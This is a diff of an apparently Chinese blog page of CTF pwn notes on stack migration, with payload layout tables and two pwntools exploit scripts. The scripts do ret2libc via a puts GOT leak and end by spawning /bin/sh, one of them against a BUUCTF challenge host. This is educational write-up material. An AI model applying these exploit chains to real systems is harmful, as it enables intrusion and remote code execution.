@@ -21,14 +21,13 @@
   <meta name="author" content="暮夜">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一. 漏洞原理二. 漏洞利用任意地址写 情况1：存在多次输入和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[">
+    <meta name="description" content="一. 漏洞原理 二. 漏洞利用 任意地址写 &gt; 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。 &gt;  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Stack_migration">
-<meta property="og:url" content="https://12yhy3.github.io/2024/11/25/stack_migrant/index.html">
+<meta property="og:title" content="Darkness_Sword">
+<meta property="og:url" content="https://12yhy3.github.io/2024/11/28/Stack_migrantion/index.html">
 <meta property="og:site_name" content="Darkness_Sword">
-<meta property="og:description" content="一. 漏洞原理二. 漏洞利用任意地址写 情况1：存在多次输入和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[">
+<meta property="og:description" content="一. 漏洞原理 二. 漏洞利用 任意地址写 &gt; 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。 &gt;  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://12yhy3.github.io/2024/11/25/stack_migrant/My_blog_website/public/img/1.png">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613471638-30dcb5b4-654c-495e-b8e2-9425aaf60ee7.png">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613479807-766b01bb-ceea-447f-b838-add0788621ca.png">
@@ -39,18 +38,17 @@
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123202931-fb0a2d97-986b-400b-8ca8-21b5269722cd.png">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123206113-46d449c7-7853-4ba0-82d4-31a631690d24.png">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123628067-5bde1dff-294d-43c0-bfc4-f186a6749ad3.png">
-<meta property="article:published_time" content="2024-11-25T01:44:24.000Z">
-<meta property="article:modified_time" content="2024-11-25T13:20:18.553Z">
+<meta property="article:published_time" content="2024-11-28T08:06:14.836Z">
+<meta property="article:modified_time" content="2024-11-28T08:06:15.101Z">
 <meta property="article:author" content="暮夜">
-<meta property="article:tag" content="&lt;span class&#x3D;&quot;label label-primary&quot;&gt;stack_migration&lt;&#x2F;span&gt;">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://12yhy3.github.io/2024/11/25/stack_migrant/My_blog_website/public/img/1.png">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Stack_migration - Darkness_Sword</title>
+  <title>Darkness_Sword</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -255,7 +253,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Stack_migration"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -271,8 +269,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-25 09:44" pubdate>
-          2024年11月25日 上午
+        <time datetime="2024-11-28 16:06" pubdate>
+          2024年11月28日 下午
         </time>
       </span>
     
@@ -357,83 +355,72 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Stack_migration</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="一-漏洞原理"><a href="#一-漏洞原理" class="headerlink" title="一. 漏洞原理"></a>一. 漏洞原理</h1><h1 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二. 漏洞利用"></a>二. 漏洞利用</h1><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><blockquote>
-<p>情况1：存在<font style="color:#DF2A3F;"><strong>多次输入</strong></font>和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。</p>
-</blockquote>
-<p>第一次溢出<strong>覆盖栈底 rbp &#x2F; ebp</strong>，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[password] + 4 ），根据第二次输入选择合适地址能够覆盖该值。</p>
-<h2 id="i386-ret2libc3"><a href="#i386-ret2libc3" class="headerlink" title="i386+ret2libc3"></a>i386+ret2libc3</h2><blockquote>
-<p>size( buffer ) &#x3D; 0x2c，read（0，&amp;(rbp-0x2c)，0x34)    【溢出覆盖 ebp , ebp+0x4】</p>
-<p>注意点：read 代码段末尾自带  leave ; ret</p>
-<p>leave &#x3D; mov ebp , esp   +   pop ebp         [ 随后 esp+0x4]</p>
-<p>ret &#x3D; pop rsp                                            [ 随后 esp+0x4]</p>
-</blockquote>
-<h3 id="payload-结构图"><a href="#payload-结构图" class="headerlink" title="payload 结构图"></a>payload 结构图</h3><table>
-<thead>
-<tr>
-<th>payload_1</th>
-<th>payload2</th>
-<th>payload3</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>buf_start<font style="color:#2F4BDA;">   </font><font style="color:#D22D8D;"> aaaa</font></td>
-<td><font style="color:#DF2A3F;">      bss+0x800</font><br>[利用后面的 leave ; ret<br> 为payload3准备ebp】</td>
-<td><font style="color:#601BDE;">aaaa</font></td>
-</tr>
-<tr>
-<td><font style="color:#D22D8D;">…</font></td>
-<td><font style="color:#DF2A3F;">puts_plt</font></td>
-<td><font style="color:#601BDE;">system</font></td>
-</tr>
-<tr>
-<td><font style="color:#D22D8D;">…</font></td>
-<td><font style="color:#DF2A3F;">      read</font>【puts 调用后返回地址】</td>
-<td><font style="color:#601BDE;">0</font></td>
-</tr>
-<tr>
-<td><font style="color:#D22D8D;">…</font></td>
-<td><font style="color:#DF2A3F;">puts_got   </font>【puts 参数】</td>
-<td><font style="color:#601BDE;">&#x2F;bin&#x2F;sh</font></td>
-</tr>
-<tr>
-<td>buf_end  <font style="color:#2F4BDA;">  </font><font style="color:#D22D8D;">aaaa</font></td>
-<td>aaaa……</td>
-<td><font style="color:#601BDE;">aaaa……</font></td>
-</tr>
-<tr>
-<td><font style="color:#2F4BDA;">ebp        </font><font style="color:#D22D8D;">  bss+0x2c</font></td>
-<td><font style="color:#DF2A3F;">bss </font></td>
-<td><font style="color:#601BDE;">bss+0x800-0x2c</font></td>
-</tr>
-<tr>
-<td><font style="color:#2F4BDA;">“eip”        </font><font style="color:#D22D8D;"> leave ; ret</font></td>
-<td><font style="color:#DF2A3F;">leave ; ret</font></td>
-<td><font style="color:#601BDE;">leave</font></td>
-</tr>
-</tbody></table>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">offset = 0x2c<br><br>bss = 0x804c000-0x900<br>puts_plt = 0x8048510           <span class="hljs-comment">#elf.plt[&#x27;puts&#x27;]</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>ebp = 0x804897b<br><span class="hljs-built_in">read</span> = 0x08048829<br>leave = 0x08048605<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*offset  + p32(bss+0x2c) + p32(<span class="hljs-built_in">read</span>)<br>io.send(payload1)<br><br>p2 = p32(bss+0x800)  + p32(puts_plt) + p32(<span class="hljs-built_in">read</span>) + p32(puts_got) <br>payload2 = p2.ljust(offset,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(bss) + p32(leave)<br>io.send(payload2)<br><br>puts  = u32(r.recvuntil(b<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-4:])<br><span class="hljs-built_in">print</span>(hex(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(hex(libc_base))<br>sym = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>p3 =b<span class="hljs-string">&#x27;a&#x27;</span>*4 + p32(sym) + p32(0) + p32(binsh_addr)<br>payload3 =p3.ljust(offset, b<span class="hljs-string">&#x27;\x00&#x27;</span>) +p32(bss +0x800 -0x2c) +p32(leave)<br>r.send(payload3)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+                <h1 id="OOFnK">一. 漏洞原理</h1>
+<h1 id="okw1B">二. 漏洞利用</h1>
+<h2 id="CQO3O">任意地址写</h2>
+> 情况1：存在**<font style="color:#DF2A3F;">多次输入</font>**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。
+>
 
-<h1 id="三-例题"><a href="#三-例题" class="headerlink" title="三. 例题"></a>三. 例题</h1><h2 id="溢出4-8字节"><a href="#溢出4-8字节" class="headerlink" title="溢出4&#x2F;8字节"></a>溢出4&#x2F;8字节</h2><h3 id="栈地址可知"><a href="#栈地址可知" class="headerlink" title="栈地址可知"></a>栈地址可知</h3><h3 id="栈地址未知"><a href="#栈地址未知" class="headerlink" title="栈地址未知"></a>栈地址未知</h3><h2 id="溢出8-16字节"><a href="#溢出8-16字节" class="headerlink" title="溢出8&#x2F;16字节"></a>溢出8&#x2F;16字节</h2><h3 id="栈地址可知-1"><a href="#栈地址可知-1" class="headerlink" title="栈地址可知"></a>栈地址可知</h3><blockquote>
-<p>如果可以获取输入地点的栈地址，或者bss段&#x2F;堆空间 找不到合适空间，并且输入点长度足够构造ROP链，可以直接在输入点进行二次栈迁移。</p>
-</blockquote>
+<p>第一次溢出<strong>覆盖栈底 rbp &#x2F; ebp</strong>，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[password] + 4 ），根据第二次输入选择合适地址能够覆盖该值。</p>
+<h2 id="oop1x">i386+ret2libc3</h2>
+> size( buffer ) = 0x2c，read（0，&(rbp-0x2c)，0x34)    【溢出覆盖 ebp , ebp+0x4】
+>
+> 注意点：read 代码段末尾自带  leave ; ret
+>
+> leave = mov ebp , esp   +   pop ebp         [ 随后 esp+0x4]
+>
+> ret = pop rsp                                            [ 随后 esp+0x4]
+>
+
+<h3 id="yUsYO">payload 结构图</h3>
+| payload_1 | payload2 | payload3 |
+| --- | --- | --- |
+| buf_start<font style="color:#2F4BDA;">   </font><font style="color:#D22D8D;"> aaaa</font> | <font style="color:#DF2A3F;">      bss+0x800</font><br>[利用后面的 leave ; ret<br> 为payload3准备ebp】 | <font style="color:#601BDE;">aaaa</font> |
+| <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">puts_plt</font> | <font style="color:#601BDE;">system</font> |
+| <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">      read</font>【puts 调用后返回地址】 | <font style="color:#601BDE;">0</font> |
+| <font style="color:#D22D8D;">...</font> | <font style="color:#DF2A3F;">puts_got   </font>【puts 参数】 | <font style="color:#601BDE;">/bin/sh</font> |
+| buf_end  <font style="color:#2F4BDA;">  </font><font style="color:#D22D8D;">aaaa</font> | aaaa...... | <font style="color:#601BDE;">aaaa......</font> |
+| <font style="color:#2F4BDA;">ebp        </font><font style="color:#D22D8D;">  bss+0x2c</font> | <font style="color:#DF2A3F;">bss </font> | <font style="color:#601BDE;">bss+0x800-0x2c</font> |
+| <font style="color:#2F4BDA;">"eip"        </font><font style="color:#D22D8D;"> leave ; ret</font> | <font style="color:#DF2A3F;">leave ; ret</font> | <font style="color:#601BDE;">leave</font> |
+
+
+<h3 id="Mzu6V">exp</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">offset = 0x2c<br><br>bss = 0x804c000-0x900<br>puts_plt = 0x8048510           <span class="hljs-comment">#elf.plt[&#x27;puts&#x27;]</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>ebp = 0x804897b<br><span class="hljs-built_in">read</span> = 0x08048829<br>leave = 0x08048605<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*offset  + p32(bss+0x2c) + p32(<span class="hljs-built_in">read</span>)<br>io.send(payload1)<br><br>p2 = p32(bss+0x800)  + p32(puts_plt) + p32(<span class="hljs-built_in">read</span>) + p32(puts_got) <br>payload2 = p2.ljust(offset,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(bss) + p32(leave)<br>io.send(payload2)<br><br>puts  = u32(r.recvuntil(b<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-4:])<br><span class="hljs-built_in">print</span>(hex(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(hex(libc_base))<br>sym = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>p3 =b<span class="hljs-string">&#x27;a&#x27;</span>*4 + p32(sym) + p32(0) + p32(binsh_addr)<br>payload3 =p3.ljust(offset, b<span class="hljs-string">&#x27;\x00&#x27;</span>) +p32(bss +0x800 -0x2c) +p32(leave)<br>r.send(payload3)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="F3tSe">三. 例题</h1>
+<h2 id="Nds5s">溢出4/8字节</h2>
+<h3 id="Polb6">栈地址可知</h3>
+<h3 id="RewXT">栈地址未知</h3>
+
+
+<h2 id="r7sOB">溢出8/16字节</h2>
+<h3 id="XTGAk">栈地址可知</h3>
+> 如果可以获取输入地点的栈地址，或者bss段/堆空间 找不到合适空间，并且输入点长度足够构造ROP链，可以直接在输入点进行二次栈迁移。
+>
+
 <blockquote>
 <p>通常可以获取栈地址的方法：</p>
 <ol>
 <li><strong>程序直接给出。</strong></li>
-<li><strong>通过printf，puts 等函数泄露。（注意：</strong><font style="color:#DF2A3F;"><strong>printf函数通过%s泄露的是 某地址 存储的</strong></font><strong>数据</strong><font style="color:#DF2A3F;"><strong>而不是实际地址</strong>，</font><strong>puts函数与之效果相同</strong>）（可参见例题2，ebp-0x40而不是ebp-0x30）。</li>
+<li><strong>通过printf，puts 等函数泄露。</strong>（注意：**<font style="color:#DF2A3F;">printf函数通过%s泄露的是  某地址 存储的 </font><strong><strong>数据</strong></strong><font style="color:#DF2A3F;">而不是实际地址，</font>**<strong>puts函数与之效果相同</strong>）（可参见例题2，ebp-0x40而不是ebp-0x30）。</li>
 </ol>
 </blockquote>
-<h4 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack migration"></a><font style="color:rgb(33, 37, 41);">stack migration</font></h4><blockquote>
-<p>题源：BUUCTF-PWN（<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]</font>）</p>
-</blockquote>
-<p><font style="color:#DF2A3F;"><strong>方法1：栈迁移+ret2libc3</strong></font></p>
-<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><img src="/2024/11/25/stack_migrant/My_blog_website\public\img\1.png" srcset="/img/loading.gif" lazyload></p>
-<h5 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h5><p>payload’2’为参考exp构造，<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xzzzz911/article/details/133842017">详见</a>。官方wp同payload2。</p>
+<h4 id="JBJza"><font style="color:rgb(33, 37, 41);">stack migration</font></h4>
+> 题源：BUUCTF-PWN（<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]</font>）
+>
+
+<p><strong><font style="color:#DF2A3F;">方法1：栈迁移+ret2libc3</font></strong></p>
+<h5 id="Ro65Z">源码</h5>
+![](https://cdn.nlark.com/yuque/0/2024/png/34628707/1706529161394-ea8e452e-5474-49ef-8a63-3c9f45b97ebd.png)
+
+<h5 id="WPQdj">栈帧结构</h5>
+payload'2'为参考exp构造，[详见](https://blog.csdn.net/Xzzzz911/article/details/133842017)。官方wp同payload2。
+
 <table>
 <thead>
 <tr>
@@ -518,9 +505,10 @@
 <td>**   leave；ret**</td>
 </tr>
 </tbody></table>
-<h5 id="栈迁移运行流程"><a href="#栈迁移运行流程" class="headerlink" title="栈迁移运行流程"></a>栈迁移运行流程</h5><blockquote>
-<p>与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。</p>
-</blockquote>
+<h5 id="Q1XAX">栈迁移运行流程</h5>
+> 与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。
+>
+
 <p>一. 栈迁移调用 puts函数 泄露puts真实地址</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif" srcset="/img/loading.gif" lazyload></p>
 <p>二. 返回到main函数后第二次栈迁移获取shell</p>
@@ -660,7 +648,8 @@
 <p>rip—&gt;system（system_plt）</p>
 <p>rsp—&gt;aaaaaa</p>
 <p><strong>接着会调用system函数，同时rdi的数据&#x2F;bin&#x2F;sh成为参数，执行了shell。</strong></p>
-<h5 id="exp示例"><a href="#exp示例" class="headerlink" title="exp示例"></a>exp示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&#x27;./pwn2&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28894</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <span class="hljs-comment">#p64(pop_rdi)</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-comment">#=堆栈平衡，令ROP向下挪移8字节（p64(0)，stack+8），否则第二次接受不到栈地址0x...=</span><br><span class="hljs-comment">#泄漏stack为第一个buf地址（第一次读入八字节的地址）</span><br>p1 = (p64(<span class="hljs-number">0</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)).ljust(offset,<span class="hljs-string">b&#x27;a&#x27;</span>) <br>p1 += p64(stack+<span class="hljs-number">8</span>) + p64(leave)<br><span class="hljs-comment">#======================================================================</span><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p1)<br>io.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br>puts =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base = puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#===============此处直接填充亦可==========================</span><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><span class="hljs-comment">#========================================================</span><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h5 id="Ke3s7">exp示例</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&#x27;./pwn2&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28894</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <span class="hljs-comment">#p64(pop_rdi)</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-comment">#=堆栈平衡，令ROP向下挪移8字节（p64(0)，stack+8），否则第二次接受不到栈地址0x...=</span><br><span class="hljs-comment">#泄漏stack为第一个buf地址（第一次读入八字节的地址）</span><br>p1 = (p64(<span class="hljs-number">0</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)).ljust(offset,<span class="hljs-string">b&#x27;a&#x27;</span>) <br>p1 += p64(stack+<span class="hljs-number">8</span>) + p64(leave)<br><span class="hljs-comment">#======================================================================</span><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p1)<br>io.recvuntil(<span class="hljs-string">b&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)<br>puts =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base = puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#===============此处直接填充亦可==========================</span><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><span class="hljs-comment">#========================================================</span><br>io.sendafter(<span 